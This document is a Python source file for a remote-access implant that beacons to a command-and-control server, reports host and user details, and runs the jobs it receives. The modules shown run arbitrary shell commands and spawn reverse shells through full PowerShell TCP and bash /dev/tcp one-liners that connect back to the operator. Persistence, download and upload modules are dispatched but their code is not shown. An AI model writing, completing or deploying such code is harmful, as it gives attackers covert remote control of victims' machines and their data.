#!/usr/bin/env python3
import socket
import json
import platform
import getpass
import uuid
import time
import subprocess
import os
import sys
import base64
import threading

class AdvancedAgent:
    def __init__(self, server_host='127.0.0.1', server_port=4444, agent_id=None):
        self.server_host = server_host
        self.server_port = server_port
        self.agent_id = agent_id or str(uuid.uuid4())
        self.running = True
        self.current_directory = os.getcwd()
        self.reverse_shells = {}  # Track active reverse shells
        
    def get_system_info(self):
        return {
            'hostname': platform.node(),
            'username': getpass.getuser(),
            'architecture': platform.architecture()[0],
            'os_version': platform.platform(),
            'python_version': platform.python_version(),
            'current_directory': self.current_directory
        }
    
    def connect(self):
        print(f"[🎯] Advanced Agent starting... ID: {self.agent_id}")
        print(f"[→] Connecting to {self.server_host}:{self.server_port}")
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30.0)
                sock.connect((self.server_host, self.server_port))
                
                print("[✓] Connected to C2 server")
                
                checkin_msg = {
                    'type': 'checkin',
                    'agent_id': self.agent_id,
                    'system_info': self.get_system_info()
                }
                sock.send(json.dumps(checkin_msg).encode('utf-8'))
                
                while self.running:
                    try:
                        data = sock.recv(4096).decode('utf-8')
                        if not data:
                            break
                            
                        message = json.loads(data)
                        if message.get('type') == 'job':
                            self.execute_and_respond(sock, message)
                            
                    except socket.timeout:
                        continue
                    except json.JSONDecodeError:
                        continue
                    except Exception as e:
                        print(f"[-] Communication error: {e}")
                        break
                        
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                print(f"[*] Reconnecting in 5 seconds...")
                time.sleep(5)
    
    def execute_and_respond(self, sock, job_message):
        job_id = job_message['job_id']
        module_name = job_message['module_name']
        arguments = job_message.get('arguments', {})
        
        print(f"[+] Executing: {module_name}")
        
        try:
            # Built-in modules
            if module_name == 'sysinfo':
                result = self.module_sysinfo(arguments)
            elif module_name == 'process_list':
                result = self.module_process_list(arguments)
            elif module_name == 'shell':
                result = self.module_shell(arguments)
            elif module_name == 'download':
                result = self.module_download(arguments)
            elif module_name == 'upload':
                result = self.module_upload(arguments)
            elif module_name == 'persistence':
                result = self.module_persistence(arguments)
            elif module_name == 'reverse_shell':
                result = self.module_reverse_shell(arguments)
            else:
                result = f"Unknown module: {module_name}"
            
            response = {
                'type': 'job_result',
                'agent_id': self.agent_id,
                'job_id': job_id,
                'output': result,
                'success': True
            }
            
        except Exception as e:
            response = {
                'type': 'job_result', 
                'agent_id': self.agent_id,
                'job_id': job_id,
                'output': f"Error: {str(e)}",
                'success': False
            }
        
        sock.send(json.dumps(response).encode('utf-8'))
        print(f"[✓] Response sent for {job_id}")
    
    def module_reverse_shell(self, arguments):
        """Spawn a reverse shell back to C2 server"""
        try:
            lhost = arguments.get('lhost', self.server_host)
            lport = arguments.get('lport', 4445)
            
            system = platform.system().lower()
            
            if system == 'windows':
                # Windows reverse shell
                cmd = f'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\\"{lhost}\\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\"PS \\" + (pwd).Path + \\"> \\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
                
                # Start in background
                import subprocess
                process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                return f"Windows reverse shell spawned to {lhost}:{lport} (PID: {process.pid})"
                
            else:
                # Linux/Mac reverse shell
                cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
                
                import subprocess
                process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                return f"Linux reverse shell spawned to {lhost}:{lport} (PID: {process.pid})"
                
        except Exception as e:
            return f"Reverse shell failed: {str(e)}"
    
    # Other module implementations (sysinfo, shell, etc.) same as before
    def module_sysinfo(self, arguments):
        import psutil
        
        info = self.get_system_info()
        info['ram_total_gb'] = round(psutil.virtual_memory().total / (1024**3), 2)
        info['ram_available_gb'] = round(psutil.virtual_memory().available / (1024**3), 2)
        info['cpu_cores'] = psutil.cpu_count()
        
        return json.dumps(info, indent=2)
    
    def module_shell(self, arguments):
        command = arguments.get('command', '')
        if not command:
            return "No command provided"
        
        try:
            if command.startswith('cd '):
                new_dir = command[3:].strip()
                try:
                    os.chdir(new_dir)
                    self.current_directory = os.getcwd()
                    return f"Changed directory to: {self.current_directory}"
                except Exception as e:
                    return f"cd failed: {str(e)}"
            
            result = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30,
                cwd=self.current_directory
            )
            return result.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Error: {str(e)}"

    # Add other modules as needed...

if __name__ == "__main__":
    agent = AdvancedAgent(server_host='127.0.0.1', server_port=4444)
    agent.connect()